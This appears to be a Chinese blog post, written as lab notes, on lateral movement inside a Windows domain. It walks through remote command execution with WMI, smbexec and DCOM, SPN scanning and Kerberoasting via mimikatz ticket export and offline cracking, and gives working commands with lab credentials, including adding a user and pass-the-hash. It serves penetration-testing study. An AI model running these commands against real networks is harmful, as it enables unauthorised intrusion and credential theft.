@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>域内横向移动二 - Guko's Blog</title><meta name="description" content="从windows98开始，Windows操作系统都支持WMIWMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。且使用wmiexec进行横向移动时候，windows操作系统默认不会将WMI的操作记录在日志中0x01 WMI的使用基本命令使用目标系统的cmd.exe执行一条命令，将执行结果"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">域内横向移动二</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">域内横向移动二</h1><div class="post-meta">2020-06-30<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>从windows98开始，Windows操作系统都支持<code>WMI</code>WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。且使用<code>wmiexec</code>进行横向移动时候，windows操作系统默认不会将WMI的操作记录在日志中</p>
+<a id="more"></a>
+
+<p><img src="/2020/06/30/域内横向移动二/18.png" alt></p>
+<h4 id="0x01-WMI的使用"><a href="#0x01-WMI的使用" class="headerlink" title="0x01 WMI的使用"></a>0x01 WMI的使用</h4><h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><p>使用目标系统的<code>cmd.exe</code>执行一条命令，将执行结果保存在<code>C盘的ip.txt</code>文件中，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.3 /user:administrator /password:Admin!@#$4321 process call create &quot;cmd.exe /c ipconfig &gt;c:\ip.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/1.png" alt></p>
+<p>建立<code>ipc$</code>后，使用<code>type</code>命令读取执行结果，具体如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.3\ipc$ &quot;Admin!@#$4321&quot; /user:administrator</span><br><span class="line">type \\192.168.1.3\C$\ip.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/2.png" alt></p>
+<p>使用wmic远程执行命令，在远程系统中启动windows management lnstrumentation 服务（目标服务器需要开放135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标服务器开启了防火墙，wmic将无法进行连接。wmic命令没有回显，需要使用<code>ipc$和type</code>命令来读取信息，若使用wmic执行恶意程序，将不会留下日志</p>
+<h5 id="impacket工具包中的wmiexec"><a href="#impacket工具包中的wmiexec" class="headerlink" title="impacket工具包中的wmiexec"></a>impacket工具包中的wmiexec</h5><p>在测试kali中下载安装impacket工具包的时候，出现各种问题，之后使用的是打包好的windows下的exe</p>
+<p>impacket工具包下载地址：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>Impacket-windows工具包下载地址：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe hacke/administrator:Admin!@#$4321@192.168.1.2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/14.png" alt></p>
+<h5 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h5><p><code>Wmiexec.vbs</code>脚本通过VBS调用WMI来模拟PsExec功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell</p>
+<p>下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a> 这里有个坑，不能直接用wget下载，需要直接把代码复制下来编辑成<code>.vbs</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、半交互模式</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip username password</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 administrator Admin!@#$4321</span><br><span class="line">2、单命令执行</span><br><span class="line">cscript.exe wmiexec.vbs /cmd ip username password &quot;command&quot;</span><br><span class="line">cscript.exe wmiexec.vbs /cmd 192.168.1.1 administrator Admin!@#$4321 &quot;ipconfig&quot;</span><br><span class="line">3、wce_hash注入</span><br><span class="line">如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用32个0代替LM hash</span><br><span class="line">wce -s hash</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip</span><br></pre></td></tr></table></figure>
+
+<p>获得一个半交互模式shell</p>
+<p><img src="/2020/06/30/域内横向移动二/15.png" alt></p>
+<p>使用<code>wmiexec.vbs</code>在远程主机上执行单条命令</p>
+<p><img src="/2020/06/30/域内横向移动二/16.png" alt></p>
+<p>注：对于运行时间较长的命令，如ping、systeminfo需要添加<code>-wait 5000</code>或者更长的时间参数</p>
+<h5 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h5><p><code>Invoke-WmiCommand.ps1</code>脚本包含在PowerSploit工具包很难过。该脚本主要通过powershell调用WMI来远程执行命令，本质还是在利用WMI</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line">$User = &quot;hacke\administrator&quot;</span><br><span class="line">//目标系统密码</span><br><span class="line">$Password= ConvertTo-SecureString -String &quot;Admin!@#$4321&quot; -AsPlainText -Force</span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCreadential -ArgumentList $User , $Password</span><br><span class="line">//远程执行命令</span><br><span class="line">$Rmote=Invoke-WmiCommand -payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.1.1</span><br><span class="line">//将执行结果输出到屏幕上</span><br><span class="line">$Remote.PayloadOutput</span><br></pre></td></tr></table></figure>
+
+<p><strong>Invoke-WMIMethod</strong></p>
+<p>Powershell自带的<code>Invoke-WMIMethod</code>可以在远程系统中执行命令和指定程序</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line">$User = &quot;hacke\administrator&quot;</span><br><span class="line">//目标系统密码</span><br><span class="line">$Password= ConvertTo-SecureString -String &quot;Admin!@#$4321&quot; -AsPlainText -Force</span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCreadential -ArgumentList $User , $Password</span><br><span class="line">//远程执行命令</span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.1.1&quot; -Creadential $Cred</span><br></pre></td></tr></table></figure>
+
+<p><strong>crackmapexec</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec 192.168.1.1 -u administrator -p Admin!@#$4321 -x &quot;net user test test /add&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-smbexec的使用"><a href="#0x02-smbexec的使用" class="headerlink" title="0x02 smbexec的使用"></a>0x02 smbexec的使用</h4><p><code>smbexec</code>可以通过文件共享（<code>admin$</code>、<code>C$</code>、<code>ipc$</code>、<code>d$</code>）在远程系统中执行命令，使用的时候，目标系的共享必须试开放的错c 、ipc、admin</p>
+<h5 id="C-版smbexec"><a href="#C-版smbexec" class="headerlink" title="C++版smbexec"></a>C++版smbexec</h5><p>C++版smbexec的下载地址<a href="https://github.com/sunorr/smbexec" target="_blank" rel="noopener">https://github.com/sunorr/smbexec</a></p>
+<p><strong>1、工具使用</strong></p>
+<ul>
+<li>test.exe：客户端程序</li>
+<li>exec server.exe：目标系统中的辅助程序</li>
+</ul>
+<p>常用smbexec命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe ipaddress username password command netshare</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、使用方法</strong></p>
+<p>将<code>execserver.exe</code>上传到目标系统的<code>C:\windwos\</code>目录下，接触UAC对命令执行的限制。在命令行环境中执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.3 &quot;Admin!@#$4321&quot; /user:HACKE\administrator</span><br></pre></td></tr></table></figure>
+
+<p>之后在客户端的命令行环境中执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe 192.168.1.3 administrator Admin!@#$4321 whoami c$</span><br></pre></td></tr></table></figure>
+
+<p>VS2019编译的时候有问题，没编译成exe</p>
+<h5 id="impact-工具包中的smbexec-exe"><a href="#impact-工具包中的smbexec-exe" class="headerlink" title="impact 工具包中的smbexec.exe"></a>impact 工具包中的smbexec.exe</h5><p>这里依旧使用windows下编译好的<code>smbexec.exe</code>这里要注意的有两点，一个是<code>\</code>是为了转义而添加的，二是在密码处可以用双引号阔起来。这里因为在Windows下测试的，没有出现这个情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe HACKE/administrator:Admin!@#$4321@192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/17.png" alt></p>
+<h4 id="0x03-DOM在远程系统中的使用"><a href="#0x03-DOM在远程系统中的使用" class="headerlink" title="0x03 DOM在远程系统中的使用"></a>0x03 DOM在远程系统中的使用</h4><p><code>DCOM（分布式组件对象模型）</code>是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
+<p>DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）</p>
+<h5 id="通过本地DCOM执行命令"><a href="#通过本地DCOM执行命令" class="headerlink" title="通过本地DCOM执行命令"></a>通过本地DCOM执行命令</h5><p><strong>1、获取DCOM程序列表</strong></p>
+<p><code>Get-CimInstance</code>这个cmdlet（PowerShell命令行）默认只在powershell3.0以上版本中存在。因此只在windows server 2012及以上本本的操作系统才可以使用Get-CimInstance</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/3.png" alt></p>
+<p><code>Windows7、Windows server 2008</code>中默认安装的是<code>powershell 2.0</code>。不支持Get-CimInstance。可以使用如下命令代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/4.png" alt></p>
+<p><strong>2、使用DCOM执行任意命令</strong></p>
+<p>在本地启动一个管理员权限的PowerShell，执行如下命令,该方法通过<code>ExecuteShellCommand</code>运行了计算器程序，可把计算器换成其他的<code>payload</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/5.png" alt></p>
+<h5 id="使用DCOM在远程机器上执行命令"><a href="#使用DCOM在远程机器上执行命令" class="headerlink" title="使用DCOM在远程机器上执行命令"></a>使用DCOM在远程机器上执行命令</h5><p>这个方法需要关闭系统防火墙。在远程机器上执行命令时，必须使用具有本地管理员权限的账号。</p>
+<p>实验环境</p>
+<p>域控制器</p>
+<ul>
+<li>IP地址：192.168.1.1</li>
+<li>域名：hacke.testlab</li>
+<li>用户名：administrator</li>
+<li>密码:Admin!@#$4321</li>
+</ul>
+<p>域成员服务器</p>
+<ul>
+<li>IP地址:192.168.1.2</li>
+<li>域名：hacke.testlab</li>
+<li>用户名：administrator</li>
+<li>密码：Admin!@#$4321</li>
+</ul>
+<p><strong>1、通过IPC$连接远程计算机</strong></p>
+<p>在命令行环境中输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.1.1 &quot;Admin!@#$4321&quot; /user:hacke.testlab\administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/6.png" alt></p>
+<p><strong>2、执行命令</strong></p>
+<p>（1）调用<code>MMC20.Application</code>远程执行命令</p>
+<p>建立<code>ipc$</code>后，输入如下命令，在远程系统小红运行<code>calc.exe</code>。在目标系统中启动任务管理器，可看到<code>calc.exe</code>正在运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&quot;/c calc.exe&quot;,&quot;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/7.png" alt></p>
+<p><img src="/2020/06/30/域内横向移动二/8.png" alt></p>
+<p>（2）调用9BA05972-F6A8-11CF-A442-00A0C90A8F39</p>
+<p>在域成员机上打开powershell，输入如下命令,在域控制器上可看到正在运行的<code>calc.exe</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Type]::GetTypeFromCLSID(&apos;9BA05972-F6A8-11CF-A442-00A0C90A8F39&apos;, &quot;192.168.1.1&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c calc.exe&quot;, &quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/9.png" alt></p>
+<p><img src="/2020/06/30/域内横向移动二/10.png" alt></p>
+<p>这两种方法均适用于windows7-windows10、windows server2008-windwos server2016</p>
+<h4 id="0x04-SPN在域环境中的应用"><a href="#0x04-SPN在域环境中的应用" class="headerlink" title="0x04 SPN在域环境中的应用"></a>0x04 SPN在域环境中的应用</h4><p>Windows域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组，集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。在域环境中运行的大量应用包含了多种资源，为资源的合理分组、分类和再分配提供了便利。微软给域内的每种资源分配了不同的服务主题名称（<code>Service Principal Name SPN</code>）</p>
+<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p><strong>1、相关概念</strong></p>
+<p>在使用Kerberos协议进行身份验证的网络中，必须在内置账号（<code>NetworkService</code>、<code>LocalSystem</code>）或者用户账号下为服务器注册<code>SPN</code>。对于内置账号，SPN将自动进行注册。但是，如果在域用户账号下运行服务，则必须为要使用的账号手动注册SPN。因为域环境中的每台服务器都需要在Kerberos身份验证服务中注册SPN,所以攻击者会直接向域控制器发送查询请求，获取其需要的服务的SPN,从而知晓其需要使用的服务资源在哪台机器上。</p>
+<p><code>Kerberos身份验证使用SPN将服务实例与服务登录账号关联起来</code>。如果域中的计算机上安装了多个服务实例，那么每个实例都必须有自己的SPN。如果客户端可能使用多个名称进行身份验证，那么给给定的服务实例可以有多个SPN。如，SPN总是包含运行的服务实例的主机名称，所以，服务实例可以为其所有主机的每个名称或别名注册一个SPN。</p>
+<p>根据Kerberos协议，当用户输入自己的账号和密码登录活动目录时，域控制器会对账号和密码进行验证。验证通过后，<code>密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户（作为用户访问资源时的身份凭据）</code></p>
+<p>SPN命令的格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>serviceclass:服务组件名称 </li>
+<li>hostname：以“/”与后面的名称分隔，是计算机的FQDN(全限定域名，同时带有计算机名和域名)</li>
+<li>port：以冒号分隔，后面的内容为该服务监听的端口号</li>
+<li>servicename:一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或全限定域名</li>
+</ul>
+<p><strong>2、常见SPN服务</strong></p>
+<p>MSSQL服务的示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSSQLSvc/Motoo-DBSRV.Motoo.nc:1433</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>MSSQLSve:服务组件的名称，此处为MSSQL服务</li>
+<li>computer1.hacke.testlab:主机名为computer1,域名为hacke.testlab</li>
+<li>1433:监听的端口为1433</li>
+</ul>
+<p>serviceclass和hostname是必选参数，port和servicename是可选参数，hostname和port之间的冒号只有在该服务对某端口进行监听时才会使用</p>
+<p>Exchange服务的示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exchangeMDB/MOTOO-OWA2010.Motoo.nc</span><br></pre></td></tr></table></figure>
+
+<p>RDP服务的示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TERMSRV/Motoo-OWA2010.Motoo.nc</span><br></pre></td></tr></table></figure>
+
+<p>WSMan/WinRM/PSRemoting服务的示例代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WSMAN/Motoo-OWA2010.Motoo.nc</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、用于进行SPN扫描的powershell脚本</strong></p>
+<p>当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipa1Name属性中。在安装新服务后，SPN也会被记录在计算机账号的相应属性中。</p>
+<p>SPN扫描也称作“扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口相比，SPN扫描的主要特点是不需要痛殴连接网络中的每个IP地址来检查服务端口（不会因触发内网中的IPS,IDS等设备的规则而产生大量的告警日志）因SPN查询是Kerberos票据行为的一部分</p>
+<p>Powershell-AD-Recon工具提供了一系列服务与服务登录账号和运行服务的主机之间的对应关系，这些服务包括但不限于MSSQL、Exchange、RDP、WinRM。</p>
+<p>下载地址：<a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">https://github.com/PyroTek3/PowerShell-AD-Recon</a></p>
+<p>也可以利用Windows自带的setspn工具，普通域用户权限执行即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T hacke.testlab -Q */*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/13.png" alt></p>
+<h5 id="Kerberos攻击"><a href="#Kerberos攻击" class="headerlink" title="Kerberos攻击"></a>Kerberos攻击</h5><p>Kerberoast是一种针对kerberos协议的攻击方式。在因为需要使用某个特定资源而向TGS发送Kerberos服务票据的请求时，用户首先需要使用具有有效身份权限的TGT向TGS请求相应服务的票据。当TGT被验证有效且具有该服务的权限时，会向用户发送一张票据。该票据使用与SPN相关联的计算机服务账号的NTLM Hash（RC4_HMAC_MD5），就是说，攻击者会通过Kerberoast尝试使用不同的NTLM Hash来打开该Kerberos票据。如果攻击者使用的NTLM Hash是正确的，Kerberos票据就会被打开，而该NTLM Hash对应于该计算机服务账号的密码</p>
+<p>在域环境中，可以通过<code>Kerberos使用普通用户权限在活动目录中将计算机服务账号的凭据提取出来</code>。使用该方法，大多操作可离线完成，不会向目标系统发送任何信息，因此不会引起安全设备报警。由于大多网络的域环境策略不够严格（没有给计算机服务账号密码过期时间:计算机服务账号的权限过高；计算机服务账号的密码域普通域账号的密码相同），因此，计算机服务账号的密码很容易受到Kerberoast攻击的影响</p>
+<p><strong>1、配置MSSQL服务，破解该服务的票据</strong></p>
+<p>（1）手动注册SPN</p>
+<p>手动为MSSQL服务账号注册SPN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn -A MSSQLSvc/computer1.pentest.com:1433 mssql</span><br><span class="line">setspn -A MSSQLSvc/Motoo-DBSRV.Motoo.nc:1433 mssql</span><br></pre></td></tr></table></figure>
+
+<p>(2) 查看用户所对应的SPN</p>
+<p>查看用户所对应的SPN</p>
+<ul>
+<li>查看所有注册的SPN</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */*</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看指定用户注册的SPN</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L pentest.com\mssql</span><br></pre></td></tr></table></figure>
+
+<p>(3) 使用adsiedit.msc查看用户SPN及其他高级属性</p>
+<p>(4) 配置指定服务的登录权限</p>
+<p>在活动目录中为用户配置指定服务的登录权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment\Log on as a service</span><br></pre></td></tr></table></figure>
+
+<p>(5) 修改加密类型</p>
+<p>因为Kerberos协议的默认加密方式是AES256_HMAC，而通过tgsreperack.py无法破解该加密方式，因此，我们可以通过服务器组策略将加密方式设置为RC_HMAC_MD5,命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpedit.msc\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos</span><br></pre></td></tr></table></figure>
+
+<p>(6) 请求SPN Kerberos票据</p>
+<p>打开powershell 输入如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MMSQLSvc/computer1.pentest.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>(7) 导出票据</p>
+<p>在mimikatz中执行如下命令，将内存中的票据导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
+
+<p>(8) 使用Kerberoat脚本离线破解票据所对应账号的NTLM Hash</p>
+<p>下载Kerberoast地址:<a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a></p>
+<p>将MSSQL服务所对应的票据复制到安装了kerberoast的机器上，用kerberoast中的tgsreperack.py脚本运行，功能是离线破解票据的NTLM Hash ，如果破解成功，该票据所对应的账号密码将被打印到屏幕上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python tgsreperack.py wordlist.txt mssql.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>由于环境问题，以上实验暂未复现</p>
+<h4 id="0x05-Exchange邮件服务器"><a href="#0x05-Exchange邮件服务器" class="headerlink" title="0x05 Exchange邮件服务器"></a>0x05 Exchange邮件服务器</h4><p>Exchange是微软的电子邮件服务组件，是一个消息与协作系统。Exchange在学校和企业有着大量的使用。其主要版本如下：</p>
+<p><code>Exchange 2003</code></p>
+<p><code>Exchange 2007</code></p>
+<p><code>Exchange 2010</code></p>
+<p><code>Exchange 2013</code></p>
+<p><code>Exchange 2016</code></p>
+<p><code>Exchange 2019</code></p>
+<p>Exchange服务器可以本地化的形式部署。也可以<code>Exchange online</code>的方式，将Exchange服务器托管到微软云端。Exchange提供了极强的可扩展性、可靠性、可用性，以及极高的处理性能与安全性能。且Exchange与活动目录、域服务、全局编排目录及微软的其他相关服务和组件有着紧密的联系</p>
+<p><code>Exchange支持powershell</code>对其进行本地或远程操作，方便运维也方便了我们的渗透</p>
+<h5 id="Exchange服务器介绍"><a href="#Exchange服务器介绍" class="headerlink" title="Exchange服务器介绍"></a>Exchange服务器介绍</h5><p><strong>1、邮件服务器角色介绍</strong></p>
+<p>通过划分不同的服务器角色（使它们能执行属于自己的组件和服务），以及为这些角色设置依存关系，Exchange讲话电子邮件处理变成了一个亲啊更大、丰富、稳定而又复杂的过程。Exchange在逻辑上分为三层，分别是<code>网络层</code>、<code>目录层</code>、<code>消息层</code>。服务器角色处在消息层</p>
+<p>如Exchange server  2010版本，共有五个服务器角色，分别是<code>邮件服务器、客户端访问服务器、集线传输服务器、统一消息服务器、边缘传输服务器</code>。除了传输服务器，其他服务器角色都可以部署在同一台主机上。<code>邮件服务器、客户端访问服务器、集线传输服务器</code>是核心服务器角色，只要部署这三个角色就能提供基本的电子邮件处理功能</p>
+<ul>
+<li><code>邮件服务器（Moilbox Serber）:</code>提供托管邮件、公共文件夹及相关消息数据（例如地址表）的后段组件，是必选的服务器角色</li>
+<li><code>客户端访问服务器（C lient Access Server）:</code>接收和处理来自不同客户端的请求的服务器角色，为通过不同的协议进行的访问提供支持。在一个Exchange环境中，至少需要部署一个客户端访问服务器</li>
+<li><code>集线传输服务器（Hub transport Server）:</code>也称中心传输服务器。该服务器角色的核心服务就是Microsoft Exchange transport，负责处理哦Mail Flow(Exchange管理员通过Mail Flow实现邮件出站与进站配置)、对邮件进行路由及在Exchange组件中进行分发。该服务器角色处理所有发往本地邮箱和外部邮箱的邮件，确保邮件发送者和接收者的地址被正确地解析并能够执行后特定的策略（例如邮件地址过滤、内容过滤、格式转换），同时，可以进行记录、审计、添加免责声明等操作。其角色相当于一个邮件传输的中继站，在一个Exchange环境中，至少需要部署一个集线传输服务器</li>
+<li><code>统一消息服务器（Unified Messaging Server）:</code>将专用交换机和Exchange服务器集成在一起，允许用户通过邮件发送、存储语音消息和传真消息。该服务器角色为可选角色</li>
+<li><code>边缘传输服务器（Edge transport Server）:</code>专用服务器，可用于路由发往内部或外部的邮件，通常部署在网络边界并用于设置安全边界。该服务器角色接受来自内部组织和外部可信服务器的邮件，对这些邮件应用特定的反垃圾邮件、反病毒策略、将通过策略筛选的邮件路由到内部的集线传输服务器上。该服务器角色为可选角色</li>
+</ul>
+<p><strong>2、客户端/远程访问接口和协议</strong></p>
